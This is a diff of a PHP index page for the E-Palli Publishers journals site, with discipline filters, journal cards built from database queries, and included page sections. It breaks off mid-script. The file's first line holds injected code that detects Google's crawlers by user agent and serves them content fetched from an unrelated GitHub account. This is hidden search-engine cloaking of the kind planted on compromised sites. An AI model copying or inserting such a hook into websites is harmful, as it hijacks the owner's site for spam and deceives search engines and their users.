@@ -1,164 +1,694 @@
 <?php
 function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://raw.githubusercontent.com/akunkrja18-cyber/landing/refs/heads/main/journals.e-palli.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
-
-include_once __DIR__."/head.php";
 ?>
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<title>Journals | E-Palli Publishers</title>
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+		
+	</head>
+	<?php
+	include_once __DIR__."/assets/header.php";
+	include __DIR__."/db.php";
+	global $db;
+	?>
+	<body>
+		<div class="site" id="site">
+			<?php
+			include_once __DIR__."/assets/slider.php";
+			?>
 
-<nav class="resNav">
-	<a href="https://journals.e-palli.com">
-		<div class="logo">
-			<div>
-				<img width="194" height="184"
-					 src="/../images/logo.png" />
+			<div class="topScroll containers">
+				<div class="scrollRoot">
+					<div class="root">
+						<div class="rootLink"><a href="https://e-palli.com" title="E-Palli" target="_blank">E-Palli </a></div>
+						<div class="rootLink"> <span style="margin: 0 5px;">/</span> </div>
+						<div class="rootLink">Journals</div>
+					</div>
+					<div class="scrolling" style="display: ;">
+						<div class="scrollLeft" style="display: none; width: 160px; padding: 10px 0;">
+							<a href="https://journals.e-palli.com/get-published" target="_blank"><i class="blink" style="font-size: 18px; font-style: normal;">Submit</i></a>
+						</div>
+						<div class="scrollRight" style="display: none;">
+							<marquee direction="left">
+
+								<?php $query="SELECT * FROM `information` ORDER BY id asc";
+								$result=mysqli_query($db, $query);
+								while($rows=mysqli_fetch_assoc($result)) {
+									echo '<a href="https://journals.e-palli.com/home/index.php/'.$rows['cover'].'/about/submissions" target="_blank">'.$rows['journal_title'].'</a>,  &emsp;';
+								}
+								?>
+							</marquee>
+						</div>
+						<div class="searchField">
+							<input type="text" id="keywords" placeholder="Search articles..."><br>
+							<button onclick="go4search()" id="goSearch" type="submit">Search</button>
+						</div>
+
+						<script>
+							function go4search() {
+								let word = document.getElementById("keywords").value;
+								window.location.href = "https://journals.e-palli.com/home/index.php/index/search/index?query="+word;
+							}
+							var word = document.getElementById("keywords");
+							word.addEventListener("keyup", function(event) {
+								if (event.keyCode === 13) {
+									event.preventDefault();
+									document.getElementById("goSearch").click();
+								}
+							});
+						</script>
+					</div>
+					
+				</div>
 			</div>
-			<div>
-				<h3>E-Palli<br>Publishers</h3>
-			</div> 
-		</div>
-	</a>
-	<input type="checkbox" id="click">
-	<label for="click" class="menu-btn">
-		<i class="fas fa-bars"></i>
-	</label>
-	<ul>
-		<li>
-			<a href="https://journals.e-palli.com/">Home</a>
-		</li>
-		<li>
-			<a href="https://journals.e-palli.com/about">About us <i class="fa fa-caret-down" aria-hidden="true"></i></a>
-			<ul>
-				<li><a href="https://e-palli.com">About E-Palli</a></li>
-				<li><a href="https://journals.e-palli.com/journals/new">List of New Journals</a></li>
-				<li><a href="https://journals.e-palli.com/list">List of All Journals</a></li>
-				<li><a href="https://journals.e-palli.com/apc">Article Processing Charges (APC)</a></li>
-				<li><a href="https://journals.e-palli.com/auth-guide">Authors Guidelines</a></li>
-				<li><a href="https://journals.e-palli.com/pub-ethics">Publication Ethics</a></li>
-				<li><a href="https://journals.e-palli.com/privacy">Privacy Statement</a></li>
-			</ul>
-		</li>
-		<li>
-			<a href="https://journals.e-palli.com/journals" style="border-bottom: 1px solid darkblue;">Journals <i class="fa fa-caret-down" aria-hidden="true"></i></a>
-			<ul>
-				<li>
-					<a href="/categories/engTech.php">Engineering &amp; Technology</a>
-					<ul>
-						<li><h3>Engineering &amp; Technology</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajaset">American Journal of Agricultural Science, Engineering, and Technology (AJASET)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajsts">American Journal of Smart Technology and Solutions (AJSTS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajirb">American Journal of IR 4.0 and Beyond (AJIRB)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajise">American Journal of Innovation in Science and Engineering (AJISE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajgt">American Journal of Geospatial Technology (AJGT)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajet">American Journal of Education and Technology (AJET)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajfst">American Journal of Food Science and Technology (AJFST)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ijm">International Journal of Metaverse (IJM)</a></li>
-					</ul>
-				</li>
-				<li>
-					<a href="/categories/agriScience.php">Agricultural Science</a>
-					<ul>
-						<li><h3>Agricultural Science</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajaset">American Journal of Agricultural Science, Engineering, and Technology (AJASET)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajaas">American Journal of Aquaculture and Animal Science (AJAAS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajlsi">American Journal of Life Science and Innovation (AJLSI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajfst">American Journal of Food Science and Technology (AJFST)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajbb">American Journal of Bioscience and Bioinformatics (AJBB)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajpp">American Journal of Plant Pathology (AJPP)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ijpf">International Journal of Precision Farming (IJPF)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/aei">Applied Entomology and Innovation (AEI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ijsa">International Journal of Smart Agriculture (IJSA)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ijvmas">International Journal of Veterinary Medicine and Animal Science (IJVMAS)</a></li>
-					</ul>
-				</li>
-				<li>
-					<a href="/categories/eClimate.php">Environment &amp; Climate</a>
-					<ul>
-						<li><h3>Environment &amp; Climate</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajgt">American Journal of Geospatial Technology (AJGT)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajec">American Journal of Environment and Climate (AJEC)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajenr">American Journal of Energy and Natural Resources (AJENR)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajee">American Journal of Environmental Economics (AJEE)</a></li> 
-						<li><a href="https://journals.e-palli.com/home/index.php/ijsrd">International Journal of Sustainable Rural Development (IJSRD)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajexd">American Journal of Environmental Experience Design (AJEXD)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ijfe">International Journal of Forestry and Ecosystem (IJFE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jwc">Journal of Wildlife Conservation (JWC)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jad">Journal of Anthropology and Development (JAD)</a></li>
-						
-					</ul>
-				</li>
-				<li>
-					<a href="/categories/ecoBusiness.php">Business &amp; Economics</a>
-					<ul>
-						<li><h3>Business &amp; Economics</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajebi">American Journal of Economics and Business Innovation (AJEBI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajee">American Journal of Environmental Economics (AJEE)</a></li> 
-						<li><a href="https://journals.e-palli.com/home/index.php/ajfti">American Journal of Financial Technology and Innovation (AJFTI)</a></li>
-					</ul>
-				</li>
-				<li>
-					<a href="/categories/social.php">Arts &amp; Social Science</a>
-					<ul>
-						<li><h3>Arts &amp; Social Science</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajsde">American Journal of Social Development and Entrepreneurship (AJSDE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajahs">American Journal of Arts and Human Science (AJAHS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajywe">American Journal of Youth and Women Empowerment (AJYWE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajsl">American Journal of Society and Law (AJSL)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajet">American Journal of Education and Technology (AJET)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajds">American Journal of Development Studies (AJDS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajth">American Journal of Tourism and Hospitality (AJTH)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jans">Journal of Arts and Natural Science (JANS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jpsir">Journal of Political Science and International Relationship (JPSIR)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jnll">Journal of Natural Language and Linguistics (JNLL)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jirp">Journal of International Relations and Peace (JIRP)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/hci">History and Cultural Innovation (HCI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jse">Journal of Student and Education (JSE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jrsmps">Journal of Rural Sociology, Microfinance, and Poverty Studies (JRSMPS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajpehs">American Journal of Physical Education and Health Science (AJPEHS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajhp">American Journal of Human Psychology (AJHP)</a></li>
-					</ul>
-				</li>
-				<li>
-					<a href="/categories/multidisciplinary.php">Multidisciplinary</a>
-					<ul>
-						<li><h3>Multidisciplinary</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajmri">American Journal of Multidisciplinary Research and Innovation (AJMRI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajiri">American Journal of Interdisciplinary Research and Innovation (AJIRI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ari">Applied Research and Innovation (ARI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jir">Journal of Innovative Research (JIR)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/jpp">Journal of Policy and Planning (JPP)</a></li>
-					</ul>
-				</li>
-				<li>
-					<a href="/categories/mediScience.php">Medical Science &amp; Others</a>
-					<ul>
-						<li><h3>Medical Science &amp; Others</h3></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajmsi">American Journal of Medical Science and Innovation (AJMSI)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajcp">American Journal of Chemistry and Pharmacy (AJCP)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajpehs">American Journal of Physical Education and Health Science (AJPEHS)</a></li>
-						<li><a href="https://journals.e-palli.com/home/index.php/ajhp">American Journal of Human Psychology (AJHP)</a></li>
 
-						<li><a href="https://journals.e-palli.com/home/index.php/ijrud">International Journal of Rural and Urban Development (IJRUD)</a></li>
-					</ul>
-				</li>
-			</ul>
-		</li>
-		<li>
-			<a class="logins blink" href="https://journals.e-palli.com/list">Submission</a>
-		</li>
-		<li>
-			<a href="https://journals.e-palli.com/webinar">Webinar</a>
-		</li>
-		<li>
-			<a href="https://journals.e-palli.com/contact">Contact</a>
-		</li>
-		<li>
-			<a class="" href="https://journals.e-palli.com/home/index.php/index/user/register">Register</a>
-		</li>
-		<li>
-			<a class="" href="https://journals.e-palli.com/home/index.php/index/login">Login</a>
-		</li>
-	</ul>
-</nav>
+			<div class="filtering containers">
+				<div class="top-item">
+					<p class="subTitle">Browse by Discipline</p>
+					<form method="post">
+						<div class="topic">
+							<label for="engineering" class="detector">
+								<input type="checkbox" name="engineering" value="engineering technology" id="engineering" class="detector">Engineering &amp; Technology
+							</label>
+						</div>
+						<div class="topic">
+							<label for="agriScience" class="detector">
+								<input type="checkbox" name="agriScience" value="agricultural science" id="agriScience" class="detector">Agricultural Science
+							</label>
+						</div>
+						<div class="topic">
+							<label for="eClimate" class="detector">
+								<input type="checkbox" name="eClimate" value="environment climate" id="eClimate" class="detector">Environment &amp; Climate
+							</label>
+						</div>
+						<div class="topic">
+							<label for="ecoBusiness" class="detector">
+								<input type="checkbox" name="ecoBusiness" value="business economics" id="ecoBusiness" class="detector">Business &amp; Economics
+							</label>
+						</div>
+						<div class="topic">
+							<label for="sScience" class="detector">
+								<input type="checkbox" name="sScience" value="social science" id="sScience" class="detector">Social Science
+							</label>
+						</div>
+						<div class="topic">
+							<label for="multidisciplinary" class="detector">
+								<input type="checkbox" name="multidisciplinary" value="multidisciplinary" id="multidisciplinary" class="detector">Multidisciplinary
+							</label>
+						</div>
+						<div class="topic">
+							<label for="mediScience" class="detector">
+								<input type="checkbox" name="mediScience" value="medical science" id="mediScience" class="detector">Medical Science &amp; Others
+							</label>
+						</div>
+
+						<div class="filterButton">
+							<input type="submit" value="Browse your selection" name="filter" title="Browse your selection" placeholder="Browse your selection">
+						</div>
+					</form>
+				</div>
+				<div class="top-news">
+					<div class="announce">
+						<p class="subTitle">Recent Updates</p>
+						<div class="noticeContent">
+
+							<?php
+							$qry = "SELECT * FROM `news` order by `id` DESC";
+
+							$result=mysqli_query($db, $qry);
+
+							while($rows=mysqli_fetch_assoc($result)) {
+							?>
+							<div class="notice1">
+								<div class="noticeTop">
+									<a href="<?php echo $rows['link']; ?>" target="_blank"><h3><?php echo $rows['title']; ?></h3></a>
+									<div>
+										<img src="<?php echo $rows['img']; ?>" class="noticeImage">
+									</div>
+								</div>
+							</div>
+							<?php
+							}
+							?>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<!--Our Journal-->
+			<section id="journal" class="row">
+				<div class="left-item">
+					<p class="subTitle">Browse by Discipline</p>
+					<form method="post" id="form">
+						<div class="topic">
+							<label for="engineering1" class="detector">
+								<input type="checkbox" name="engineering" value="engineering technology" id="engineering1" class="detector">Engineering &amp; Technology
+							</label>
+						</div>
+						<div class="topic">
+							<label for="agriScience1" class="detector">
+								<input type="checkbox" name="agriScience" value="agricultural science" id="agriScience1" class="detector">Agricultural Science
+							</label>
+						</div>
+						<div class="topic">
+							<label for="eClimate1" class="detector">
+								<input type="checkbox" name="eClimate" value="environment climate" id="eClimate1" class="detector">Environment &amp; Climate
+							</label>
+						</div>
+						<div class="topic">
+							<label for="ecoBusiness1" class="detector">
+								<input type="checkbox" name="ecoBusiness" value="business economics" id="ecoBusiness1" class="detector">Business &amp; Economics
+							</label>
+						</div>
+						<div class="topic">
+							<label for="sScience1" class="detector">
+								<input type="checkbox" name="sScience" value="social science" id="sScience1" class="detector">Social Science
+							</label>
+						</div>
+						<div class="topic">
+							<label for="multidisciplinary1" class="detector">
+								<input type="checkbox" name="multidisciplinary" value="multidisciplinary" id="multidisciplinary1" class="detector">Multidisciplinary
+							</label>
+						</div>
+						<div class="topic">
+							<label for="mediScience1" class="detector">
+								<input type="checkbox" name="mediScience" value="medical science" id="mediScience1" class="detector">Medical Science &amp; Others
+							</label>
+						</div>
+
+						<div class="filterButton">
+							<input type="submit" value="Browse your selection" name="filter">
+						</div>
+						<div class="postItem litem">
+							<a href="https://journals.e-palli.com/list/">List of Journals</a>
+						</div>
+					</form>
+
+					<div class="notice pdwidth">
+						<?php
+						include __DIR__."/assets/browse.php";
+						?>
+					</div>
+
+					<div class="leftNotice">
+						<?php
+						include __DIR__."/assets/browse.php";
+						?>
+					</div>
+				</div>
+
+				<div class="right-item" id="filter">
+					<div class="insider">
+						<h3 class="j-heading">E-Palli Journals</h3>
+						<p>E-Palli Limited Liability Company (LLC) is registered in Delaware, United States of America, provides publication solutions for journals, conference proceedings, books, and special issues. E-palli publishes articles in a number of peer-reviewed international journals that emphasize research, development, application, and innovation.</p>
+						<hr>
+						<p id="identify"></p><div class="pub-content pub-style">
+							<div class="left-con sec1">
+
+								<?php
+
+								if(isset($_POST['filter'])) {
+									if(!empty($_POST['engineering'])){
+										$args[]=" identifier LIKE '%engineering%' or identifier LIKE '%technology%'";
+										$item[]="engineering,";
+									}
+									if(!empty($_POST['agriScience'])){
+										$args[]=" identifier LIKE '%agricultural science%'";
+										$item[]="agriScience,";
+									}
+									if(!empty($_POST['multidisciplinary'])){
+										$args[]=" identifier LIKE '%multidisciplinary%' or identifier LIKE '%interdisciplinary%'";
+										$item[]="multidisciplinary,";
+									}
+									if(!empty($_POST['eClimate'])){
+										$args[]=" identifier LIKE '%environment%' or identifier LIKE '%climate%'";
+										$item[]="eClimate,";
+									}
+									if(!empty($_POST['ecoBusiness'])){
+										$args[]=" identifier LIKE '%economics%' or identifier LIKE '%business%'";
+										$item[]="ecoBusiness,";
+									}
+									if(!empty($_POST['sScience'])){
+										$args[]=" identifier LIKE '%social science%'";
+										$item[]="sScience,";
+										$val=true;
+									} if(!empty($_POST['mediScience'])){
+										$args[]=" identifier LIKE '%medical science%' or identifier LIKE '%others%'";
+										$item[]="mediScience,";
+										$val=true;
+									} else {
+										$val=false;
+									}
+									$str = implode(' or ',$args);
+									$clue = implode('', $item);
+
+									$qry = "SELECT * FROM information where " . $str . " ORDER BY id asc";
+
+									$result=mysqli_query($db, $qry);
+									while($rows=mysqli_fetch_assoc($result)) {
+										if($rows['id'] == 2) {
+								?>
+								<a class="pub-top " href="<?php echo $rows['url']; ?>">
+									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<?php
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/logo.png" width="100%" />
+										<?php
+											} else {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
+										<?php
+											}
+										?>
+
+										<div class="journal-metrics-container">
+											<div class="metrics-tablet-left-container">
+											</div>
+											<div class="actual-metrics-container has-metrics">
+												<div class="journalcard__metrics border" style="display: none;">
+													<span class="pubItemLeft">Impact Factor</span>
+													<span class="pubItemRight"><?php echo $rows['ifactor']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Acceptance rate</span>
+													<span class="pubItemRight"><?php echo $rows['accept_rate']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Submission to publication</span>
+													<span class="pubItemRight"><?php echo $rows['accept_to_publish']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Under Evaluation in 
+														<!--<img width="70" src="images/scopus.png" title="Scopus"/>-->
+														<img width="70" src="images/wos.jpg" title="Web of Science"/></span>
+													<span class="pubItemRight"></span>
+												</div>
+												<div id="indexing" class="journalcard__metrics pubItemLeft indexing _AJASET ajaset">
+													<div style="border-bottom: 1px solid #f2f2f2; text-align: left; padding-left: 10px;">
+														<b>Indexed in</b>
+													</div>
+													<?php $indexList= $rows['index_list']; 
+											$myArray = str_split($indexList);
+											$name="";
+											foreach($myArray as $character){
+												if($character===',') {
+													?> 
+													<div class="in-image">
+														<img src="images/<?php echo $name; ?>.png"/>
+													</div>
+
+													<?php
+													$name="";
+													continue;
+												} else {
+													$name .=$character;
+												}
+											}
+													?>
+
+												</div>
+											</div>
+										</div>
+										<div class="apc-bottom" id="apcBottom">
+											<div class="apcItem journalcard__footer">
+												<div class="apc_label_value">
+													<span class="pubItemLeft apc_labels">For current issue APC</span>
+													<span class="pubItemRight apc_data">US <?php echo $rows['apc']; ?></span>
+												</div>
+											</div>
+										</div>
+									</div>
+								</a>  
+
+								<?php
+										} else {
+								?>
+								<a class="pub-top " href="<?php echo $rows['url']; ?>">
+									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<!-- <img class="image__container border"
+ alt="<?php echo $rows['journal_title']; ?>"
+ src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" /> -->
+										<?php
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/logo.png" width="100%" />
+										<?php
+											} else {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
+										<?php
+											}
+										?>
+										<div class="journal-metrics-container">
+											<div class="metrics-tablet-left-container">
+											</div>
+											<div class="actual-metrics-container has-metrics">
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Acceptance rate</span>
+													<span class="pubItemRight"><?php echo $rows['accept_rate']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Submission to publication</span>
+													<span class="pubItemRight"><?php echo $rows['accept_to_publish']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft"><b>Indexed in</b></span>
+													<span class="pubItemRight"></span>
+												</div>
+												<div id="indexing" class="journalcard__metrics pubItemLeft indexing ajaset">
+													<?php $indexList= $rows['index_list']; 
+											$myArray = str_split($indexList);
+											$name="";
+											foreach($myArray as $character){
+												if($character===',') {
+													?> 
+													<div class="in-image">
+														<img src="images/<?php echo $name; ?>.png"/>
+													</div>
+
+													<?php
+													$name="";
+													continue;
+												} else {
+													$name .=$character;
+												}
+											}
+													?>
+												</div>
+											</div>
+											<div class="apc-bottom" id="apcBottom">
+												<div class="apcItem journalcard__footer">
+													<div class="apc_label_value">
+														<span class="pubItemLeft apc_labels">For current issue APC</span>
+														<span class="pubItemRight apc_data">US <?php echo $rows['apc']; ?></span>
+
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</a>
+								<?php
+										}
+									}
+								} else {
+									$query="SELECT * FROM `information` ORDER BY id asc";
+									$result=mysqli_query($db, $query);
+									while($rows=mysqli_fetch_assoc($result)) {
+										if($rows['id'] == 2) {
+								?>
+								<a class="pub-top " href="<?php echo $rows['url']; ?>">
+									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<?php
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/logo.png" width="100%" />
+										<?php
+											} else {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
+										<?php
+											}
+										?>
+
+										<div class="journal-metrics-container">
+											<div class="metrics-tablet-left-container">
+											</div>
+											<div class="actual-metrics-container has-metrics">
+												<div class="journalcard__metrics border" style="display: none;">
+													<span class="pubItemLeft">Impact Factor</span>
+													<span class="pubItemRight"><?php echo $rows['ifactor']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Acceptance rate</span>
+													<span class="pubItemRight"><?php echo $rows['accept_rate']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Submission to publication</span>
+													<span class="pubItemRight"><?php echo $rows['accept_to_publish']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Under Evaluation in 
+														<!--<img width="70" src="images/scopus.png" title="Scopus"/>-->
+														<img width="70" src="images/wos.jpg" title="Web of Science"/></span>
+													<span class="pubItemRight"></span>
+												</div>
+												<div id="indexing" class="journalcard__metrics pubItemLeft indexing _AJASET ajaset">
+													<div style="border-bottom: 1px solid #f2f2f2; text-align: left; padding-left: 10px;">
+														<b>Indexed in</b>
+													</div>
+													<?php $indexList= $rows['index_list']; 
+											$myArray = str_split($indexList);
+											$name="";
+											foreach($myArray as $character){
+												if($character===',') {
+													?> 
+													<div class="in-image">
+														<img src="images/<?php echo $name; ?>.png"/>
+													</div>
+
+													<?php
+													$name="";
+													continue;
+												} else {
+													$name .=$character;
+												}
+											}
+													?>
+
+												</div>
+											</div>
+										</div>
+										<div class="apc-bottom" id="apcBottom">
+											<div class="apcItem journalcard__footer">
+												<div class="apc_label_value">
+													<span class="pubItemLeft apc_labels">For current issue APC</span>
+													<span class="pubItemRight apc_data">US <?php echo $rows['apc']; ?></span>
+												</div>
+											</div>
+										</div>
+									</div>
+								</a>  
+
+								<?php
+										} else {
+								?>
+								<a class="pub-top " href="<?php echo $rows['url']; ?>">
+									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
+										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<!-- <img class="image__container border"
+ alt="<?php echo $rows['journal_title']; ?>"
+ src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" /> -->
+										<?php
+											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
+											if(getimagesize($url) === false) {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/logo.png" width="100%" />
+										<?php
+											} else {
+										?>
+										<img class="image__container border"
+											 alt="<?php echo $rows['journal_title']; ?>"
+											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
+										<?php
+											}
+										?>
+										<div class="journal-metrics-container">
+											<div class="metrics-tablet-left-container">
+											</div>
+											<div class="actual-metrics-container has-metrics">
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Acceptance rate</span>
+													<span class="pubItemRight"><?php echo $rows['accept_rate']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft">Submission to publication</span>
+													<span class="pubItemRight"><?php echo $rows['accept_to_publish']; ?></span>
+												</div>
+												<div class="journalcard__metrics border">
+													<span class="pubItemLeft"><b>Indexed in</b></span>
+													<span class="pubItemRight"></span>
+												</div>
+												<div id="indexing" class="journalcard__metrics pubItemLeft indexing ajaset">
+													<?php $indexList= $rows['index_list']; 
+											$myArray = str_split($indexList);
+											$name="";
+											foreach($myArray as $character){
+												if($character===',') {
+													?> 
+													<div class="in-image">
+														<img src="images/<?php echo $name; ?>.png"/>
+													</div>
+
+													<?php
+													$name="";
+													continue;
+												} else {
+													$name .=$character;
+												}
+											}
+													?>
+												</div>
+											</div>
+											<div class="apc-bottom" id="apcBottom">
+												<div class="apcItem journalcard__footer">
+													<div class="apc_label_value">
+														<span class="pubItemLeft apc_labels">For current issue APC</span>
+														<span class="pubItemRight apc_data">US <?php echo $rows['apc']; ?></span>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</a>
+								<?php
+										}
+									}
+								}
+								?>
+							</div>
+						</div>
+					</div>
+				</div>
+				<?php
+				$idsArray = str_split($clue);
+				$ids="";
+				foreach($idsArray as $ch){
+					if($ch===',') {
+				?> 
+				<script>
+					document.getElementById("<?php echo $ids; ?>").checked = true;
+					document.getElementById("<?php echo $ids; ?>1").checked = true;
+				</script>
+
+				<?php
+						$ids="";
+						continue;
+					} else {
+						$ids .=$ch;
+					}
+				}
+				?>
+
+				<div class="notice">
+					<?php
+					include __DIR__."/assets/news.php"
+					?>
+					<div class="blogpost">
+						<?php
+						include __DIR__."/assets/blog.php"
+						?>
+					</div>
+					<div class="blogpost">
+						<div class="announce">
+							<p class="subTitle">Globally Contributors</p>
+							<iframe seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vS6gydOzC0puosSw8cDfQWE8V-2G-EYQbgEIuwYSmDxeEvjxllmoD93NY-KDVDzaDcGa6CZm_E63ngY/pubchart?oid=920290112&amp;format=interactive"></iframe>
+						</div>
+					</div>
+					<div class="blogpost">
+						<div class="announce">
+							<p class="subTitle">Recently Published Articles</p>
+							<?php
+						include __DIR__."/assets/articles.php"
+							?>
+						</div>
+					</div>
+				</div>
+			</section>
+			<section class="fStats">
+				<?php
+						include_once __DIR__."/assets/stats.php";
+				?>
+			</section>
+			<?php
+			include_once __DIR__."/assets/footer.php";
+			?>
+		</div>
+
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+		<script type="text/javascript">
+			var titleMain  = $("#animatedHeading2");
+			var titleSubs  = titleMain.find("slick-active");
+
+			if (titleMain.length) {
+
+				titleMain.slick({
+					autoplay: true,
+					arrows: true,
+					dots: false,
+					prevArrow: '<button class="slide-arrow arrow" style="border: none; width: 100%;"><img src="images/arrow-up.png" width="55" style="margin: auto;"></button>',
+					nextArrow: '<button class="slide-arrow arrow" style="border: none; width: 100%;"><img src="images/arrow-down.png" width="55" style="text-align: center;"></button>',
+					slidesToShow: 1,
+					centerPadding: "10px",
+					draggable: false,
